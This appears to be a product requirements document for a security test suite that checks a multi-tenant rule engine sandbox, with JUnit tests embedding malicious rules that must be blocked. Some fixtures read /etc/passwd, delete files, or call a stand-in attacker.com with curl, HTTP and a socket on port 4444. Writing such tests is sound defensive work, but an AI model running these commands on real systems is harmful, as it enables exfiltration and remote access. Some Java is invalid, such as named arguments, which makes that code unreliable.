# PRD-005e: Security Testing Suite

**Parent PRD:** PRD-005 (Rule Engine Sandboxing)
**Unit:** E (Security Validation)
**Priority:** P0
**Dependencies:** Unit A, B, C, D (all previous units)

## Scope

This unit implements comprehensive security tests to validate the sandbox prevents malicious rule behavior. It covers all attack vectors documented in the parent PRD and ensures the sandbox enforcement is working correctly.

**What this unit provides:**
- Malicious rule tests (6 attack scenarios)
- Cross-tenant isolation tests
- Sandbox enforcement validation tests
- Audit trail verification tests
- Compliance span validation tests

**What this unit does NOT include:**
- Performance benchmarks (out of scope for security tests)
- Denial-of-service protection tests (covered in PRD-007)

## Attack Vectors Tested

### 1. Unauthorized Service Access
- ❌ Rule tries to call non-whitelisted methods on SignalService
- ❌ Rule tries to access SignalService via reflection
- ✅ Expected: SecurityException, violation recorded

### 2. Cross-Tenant Data Access
- ❌ Rule tries to create signal for different tenant
- ❌ Rule tries to access other tenant's context
- ✅ Expected: SecurityException, CRITICAL violation

### 3. File System Access
- ❌ Rule tries to read files (e.g., /etc/passwd)
- ❌ Rule tries to write files
- ❌ Rule tries to delete files
- ✅ Expected: SecurityException, CRITICAL violation

### 4. Network Access
- ❌ Rule tries to make HTTP requests
- ❌ Rule tries to open sockets
- ✅ Expected: SecurityException, HIGH violation

### 5. Reflection Abuse
- ❌ Rule uses reflection to access private fields
- ❌ Rule uses reflection to invoke private methods
- ✅ Expected: SecurityException, HIGH violation

### 6. Class Loading Violations
- ❌ Rule tries to load arbitrary classes
- ❌ Rule tries to access ClassLoader
- ✅ Expected: SecurityException, MEDIUM violation

## Implementation

### 1. Malicious Rule Tests

**`MaliciousRuleTest.java`:**
```java
package com.fluo.security;

import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.AfterEach;
import static org.junit.jupiter.api.Assertions.*;

/**
 * Security tests validating sandbox prevents malicious rule behavior.
 * Tests 6 attack vectors documented in PRD-005.
 */
@QuarkusTest
public class MaliciousRuleTest {

    @Inject
    DroolsRuleEngine ruleEngine;

    @Inject
    RuleEvaluationService evaluationService;

    @Inject
    TigerBeetleClient tbClient;

    @Inject
    SafeRuleCapabilities capabilities;

    @AfterEach
    public void tearDown() {
        SafeRuleCapabilities.clearContext();
    }

    // ===== Attack Vector 1: Unauthorized Service Access =====

    @Test
    public void testRuleCannotAccessSignalServiceDirectly() {
        String maliciousRule = """
            package com.fluo.rules;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Access SignalService"
            when
                $span: Span()
            then
                // Try to cast capabilities to SignalService
                ((com.fluo.services.SignalService) capabilities).deleteAllSignals();
            end
            """;

        // Should fail compilation or throw SecurityException at runtime
        assertThrows(Exception.class, () -> {
            ruleEngine.compileAndDeployRules("tenant-1", List.of(maliciousRule));
        });
    }

    @Test
    public void testRuleCannotCallNonWhitelistedMethods() {
        String maliciousRule = """
            package com.fluo.rules;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Call Undefined Method"
            when
                $span: Span()
            then
                capabilities.deleteAllSignals(); // Method doesn't exist on interface
            end
            """;

        // Should fail compilation
        assertThrows(CompilationException.class, () -> {
            ruleEngine.compileAndDeployRules("tenant-1", List.of(maliciousRule));
        });
    }

    // ===== Attack Vector 2: Cross-Tenant Access =====

    @Test
    public void testRuleCannotAccessOtherTenantData() {
        SafeRuleCapabilities.setContext("tenant-a", "trace-1", "rule-1");

        // Rule tries to create signal for different tenant
        assertThrows(SecurityException.class, () -> {
            capabilities.createSignal("rule-1", "Evil Rule",
                Map.of("targetTenant", "tenant-b"));
        });

        // Verify CRITICAL violation recorded
        List<TBTransfer> violations = tbClient.getAccountTransfers(
            tenantAccountId("tenant-a"),
            filterByCode: 7,
            filterBySeverity: CRITICAL
        );
        assertTrue(violations.size() > 0);
    }

    @Test
    public void testRuleCannotGetOtherTenantContext() {
        // Set context for tenant-a
        SafeRuleCapabilities.setContext("tenant-a", "trace-1", "rule-1");

        String tenantId = capabilities.getCurrentTenantId();
        assertEquals("tenant-a", tenantId);

        // Try to change context (should fail)
        assertThrows(SecurityException.class, () -> {
            SafeRuleCapabilities.setContext("tenant-b", "trace-2", "rule-2");
            // Attempting to override context without clearing first
        });
    }

    // ===== Attack Vector 3: File System Access =====

    @Test
    public void testRuleCannotReadFiles() {
        String maliciousRule = """
            package com.fluo.rules;
            import java.io.File;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Read Secrets"
            when
                $span: Span()
            then
                new File("/etc/passwd").exists(); // Try to probe file system
            end
            """;

        // Should fail - File class not accessible
        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        // Verify CRITICAL violation recorded
        verifyViolationRecorded("tenant-1", "rule-1", "FILE_SYSTEM_ACCESS", "CRITICAL");
    }

    @Test
    public void testRuleCannotWriteFiles() {
        String maliciousRule = """
            package com.fluo.rules;
            import java.nio.file.Files;
            import java.nio.file.Path;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Write File"
            when
                $span: Span()
            then
                Files.writeString(Path.of("/tmp/evil.txt"), "hacked");
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "FILE_SYSTEM_ACCESS", "CRITICAL");
    }

    @Test
    public void testRuleCannotDeleteFiles() {
        String maliciousRule = """
            package com.fluo.rules;
            import java.io.File;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Delete File"
            when
                $span: Span()
            then
                new File("/important.txt").delete();
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "FILE_SYSTEM_ACCESS", "CRITICAL");
    }

    // ===== Attack Vector 4: Network Access =====

    @Test
    public void testRuleCannotExecuteSystemCommands() {
        String maliciousRule = """
            package com.fluo.rules;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Exec Command"
            when
                $span: Span()
            then
                Runtime.getRuntime().exec("curl attacker.com");
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "NETWORK_ACCESS", "HIGH");
    }

    @Test
    public void testRuleCannotMakeHttpRequests() {
        String maliciousRule = """
            package com.fluo.rules;
            import java.net.http.HttpClient;
            import java.net.http.HttpRequest;
            import java.net.URI;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "HTTP Request"
            when
                $span: Span()
            then
                HttpClient client = HttpClient.newHttpClient();
                HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://attacker.com"))
                    .build();
                client.send(request, HttpResponse.BodyHandlers.ofString());
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "NETWORK_ACCESS", "HIGH");
    }

    @Test
    public void testRuleCannotOpenSockets() {
        String maliciousRule = """
            package com.fluo.rules;
            import java.net.Socket;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Open Socket"
            when
                $span: Span()
            then
                new Socket("attacker.com", 4444);
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "NETWORK_ACCESS", "HIGH");
    }

    // ===== Attack Vector 5: Reflection Abuse =====

    @Test
    public void testRuleCannotReflectToAccessServices() {
        String maliciousRule = """
            package com.fluo.rules;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Reflection Attack"
            when
                $span: Span()
            then
                // Try to access underlying SignalService via reflection
                Object service = capabilities.getClass()
                    .getDeclaredField("signalService")
                    .get(capabilities);
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "REFLECTION_ABUSE", "HIGH");
    }

    @Test
    public void testRuleCannotInvokePrivateMethods() {
        String maliciousRule = """
            package com.fluo.rules;
            import java.lang.reflect.Method;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "Private Method Invocation"
            when
                $span: Span()
            then
                Method method = capabilities.getClass()
                    .getDeclaredMethod("recordViolation", String.class, String.class, String.class);
                method.setAccessible(true);
                method.invoke(capabilities, "ctx", "rule-1", "FAKE_VIOLATION", "test");
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "REFLECTION_ABUSE", "HIGH");
    }

    // ===== Attack Vector 6: Class Loading Violations =====

    @Test
    public void testRuleCannotLoadArbitraryClasses() {
        String maliciousRule = """
            package com.fluo.rules;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "ClassLoader Attack"
            when
                $span: Span()
            then
                Class<?> cls = Class.forName("com.fluo.services.TenantService");
                Object instance = cls.getDeclaredMethod("deleteAllTenants").invoke(null);
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "CLASS_LOADING_VIOLATION", "MEDIUM");
    }

    @Test
    public void testRuleCannotAccessClassLoader() {
        String maliciousRule = """
            package com.fluo.rules;
            global com.fluo.services.RuleCapabilities capabilities;

            rule "ClassLoader Access"
            when
                $span: Span()
            then
                ClassLoader loader = capabilities.getClass().getClassLoader();
                loader.loadClass("com.fluo.services.SignalService");
            end
            """;

        assertThrows(SecurityException.class, () -> {
            ruleEngine.compileAndEvaluate("tenant-1", "rule-1", maliciousRule, new Span());
        });

        verifyViolationRecorded("tenant-1", "rule-1", "CLASS_LOADING_VIOLATION", "MEDIUM");
    }

    // ===== Helper Methods =====

    private void verifyViolationRecorded(String tenantId, String ruleId, String violationType, String severity) {
        List<TBTransfer> violations = tbClient.getAccountTransfers(
            tenantAccountId(tenantId),
            filterByCode: 7,
            filterByViolationType: violationType
        );

        assertTrue(violations.size() > 0,
            "Expected violation recorded in TigerBeetle for " + violationType);

        // Verify compliance spans generated
        List<ComplianceSpan> cc66Spans = complianceService.getSpans(tenantId, "SOC2", "CC6.6");
        assertTrue(cc66Spans.size() > 0, "Expected CC6.6 compliance span");

        List<ComplianceSpan> cc71Spans = complianceService.getSpans(tenantId, "SOC2", "CC7.1");
        assertTrue(cc71Spans.size() > 0, "Expected CC7.1 compliance span");
    }

    private UUID tenantAccountId(String tenantId) {
        return UUID.nameUUIDFromBytes(tenantId.getBytes());
    }
}
```

### 2. Cross-Tenant Isolation Tests

**`CrossTenantIsolationTest.java`:**
```java
package com.fluo.security;

import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests validating tenant isolation in sandbox.
 */
@QuarkusTest
public class CrossTenantIsolationTest {

    @Inject
    SafeRuleCapabilities capabilities;

    @Inject
    SignalService signalService;

    @Test
    public void testTenantContextIsolation() {
        // Set context for tenant-a
        SafeRuleCapabilities.setContext("tenant-a", "trace-1", "rule-1");

        capabilities.createSignal("rule-1", "Test", Map.of());

        // Verify signal created for tenant-a only
        List<Signal> tenantASignals = signalService.getSignalsForTenant("tenant-a");
        assertEquals(1, tenantASignals.size());

        List<Signal> tenantBSignals = signalService.getSignalsForTenant("tenant-b");
        assertEquals(0, tenantBSignals.size());
    }

    @Test
    public void testConcurrentTenantEvaluations() throws Exception {
        CountDownLatch latch = new CountDownLatch(2);

        // Tenant A evaluation
        Thread threadA = new Thread(() -> {
            SafeRuleCapabilities.setContext("tenant-a", "trace-a", "rule-1");
            capabilities.createSignal("rule-1", "Tenant A Signal", Map.of());
            assertEquals("tenant-a", capabilities.getCurrentTenantId());
            SafeRuleCapabilities.clearContext();
            latch.countDown();
        });

        // Tenant B evaluation
        Thread threadB = new Thread(() -> {
            SafeRuleCapabilities.setContext("tenant-b", "trace-b", "rule-2");
            capabilities.createSignal("rule-2", "Tenant B Signal", Map.of());
            assertEquals("tenant-b", capabilities.getCurrentTenantId());
            SafeRuleCapabilities.clearContext();
            latch.countDown();
        });

        threadA.start();
        threadB.start();
        latch.await();

        // Verify no cross-contamination
        List<Signal> tenantASignals = signalService.getSignalsForTenant("tenant-a");
        assertEquals(1, tenantASignals.size());
        assertEquals("rule-1", tenantASignals.get(0).getRuleId());

        List<Signal> tenantBSignals = signalService.getSignalsForTenant("tenant-b");
        assertEquals(1, tenantBSignals.size());
        assertEquals("rule-2", tenantBSignals.get(0).getRuleId());
    }
}
```

### 3. Sandbox Enforcement Tests

**`CapabilitySandboxTest.java`:**
```java
package com.fluo.security;

import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests validating sandbox capability enforcement.
 */
@QuarkusTest
public class CapabilitySandboxTest {

    @Inject
    SafeRuleCapabilities capabilities;

    @Test
    public void testSafeCapabilityWorks() {
        SafeRuleCapabilities.setContext("tenant-1", "trace-1", "rule-1");

        // Should succeed - createSignal is whitelisted
        capabilities.createSignal("rule-1", "Test Signal", Map.of("key", "value"));

        // Verify signal created
        List<Signal> signals = signalService.getSignalsForTenant("tenant-1");
        assertEquals(1, signals.size());
    }

    @Test
    public void testReadOnlyCapabilitiesHaveNoSideEffects() {
        SafeRuleCapabilities.setContext("tenant-1", "trace-1", "rule-1");

        String traceId = capabilities.getCurrentTraceId();
        String tenantId = capabilities.getCurrentTenantId();

        assertEquals("trace-1", traceId);
        assertEquals("tenant-1", tenantId);

        // Verify no side effects (no signals, no audit events beyond context tracking)
    }

    @Test
    public void testLogRuleExecutionSanitizesInput() {
        SafeRuleCapabilities.setContext("tenant-1", "trace-1", "rule-1");

        String maliciousLog = "Evil log\n\r\tInjection attempt\u0000";
        capabilities.logRuleExecution("rule-1", maliciousLog);

        // Verify sanitized (check audit log)
        // Expected: "Evil log   Injection attempt " (no control chars)
    }
}
```

## Success Criteria

**Security Requirements:**
- [ ] All 6 attack vectors blocked (18 test scenarios)
- [ ] Cross-tenant isolation enforced (no data leakage)
- [ ] Violations recorded in TigerBeetle (code=7)
- [ ] Compliance spans generated for all violations
- [ ] Audit trail queryable for forensics

**Testing Requirements:**
- [ ] 100% test coverage for attack vectors
- [ ] All malicious rules throw SecurityException
- [ ] All violations classified by severity
- [ ] Integration tests verify end-to-end enforcement

**Performance:**
- [ ] Security tests run in <30 seconds
- [ ] No performance degradation from sandbox checks

## Files to Create

**Tests - Security Tests:**
- `backend/src/test/java/com/fluo/security/MaliciousRuleTest.java` - 18 malicious rule scenarios
- `backend/src/test/java/com/fluo/security/CrossTenantIsolationTest.java` - Tenant isolation validation
- `backend/src/test/java/com/fluo/security/CapabilitySandboxTest.java` - Capability enforcement validation

## Files to Modify

None (this unit only creates tests)

## Dependencies

**Requires:**
- Unit A: SafeRuleCapabilities (foundation)
- Unit B: Camel audit routes (violation recording)
- Unit C: Compliance spans (evidence generation)
- Unit D: Rule engine integration (end-to-end testing)

**Blocks:**
- None (final unit)

## Test Execution

### Run Security Tests

```bash
# Run all security tests
mvn test -Dtest=MaliciousRuleTest,CrossTenantIsolationTest,CapabilitySandboxTest

# Run specific attack vector
mvn test -Dtest=MaliciousRuleTest#testRuleCannotAccessFileSystem

# Run with verbose output
mvn test -X -Dtest=MaliciousRuleTest
```

### Expected Output

All tests should **PASS** with violations recorded:

```
[INFO] Running com.fluo.security.MaliciousRuleTest
[INFO] Tests run: 18, Failures: 0, Errors: 0, Skipped: 0

[AUDIT] Violation recorded: CROSS_TENANT_ACCESS (CRITICAL)
[AUDIT] Violation recorded: FILE_SYSTEM_ACCESS (CRITICAL)
[AUDIT] Violation recorded: NETWORK_ACCESS (HIGH)
[AUDIT] Violation recorded: REFLECTION_ABUSE (HIGH)
[AUDIT] Violation recorded: CLASS_LOADING_VIOLATION (MEDIUM)
```

## Threat Model Validation

This test suite validates protection against:

✅ **Protected Attacks:**
1. Malicious tenant writes rule to delete all data → BLOCKED
2. Compromised tenant accesses other tenants' data → BLOCKED (CRITICAL)
3. Rule exfiltrates data via network → BLOCKED (HIGH)
4. Rule reads secrets from file system → BLOCKED (CRITICAL)
5. Rule uses reflection to bypass sandbox → BLOCKED (HIGH)
6. Rule loads arbitrary classes → BLOCKED (MEDIUM)

❌ **Out of Scope (Future PRDs):**
1. Denial of service (infinite loops) → PRD-007
2. Resource exhaustion (too many signals) → PRD-007
3. Logic bombs (time-based malicious behavior) → Future

## Compliance Evidence

**For Auditors:**

Query violations in Grafana:
```
# All sandbox violations
{span.compliance.framework = "SOC2" && span.compliance.control = "CC7.1"}

# Critical violations only
{span.compliance.severity = "CRITICAL"}
```

Query violations in TigerBeetle:
```java
// Get all violations for tenant
List<TBTransfer> violations = tbClient.getAccountTransfers(
    tenantAccountId("tenant-1"),
    filterByCode: 7
);
```
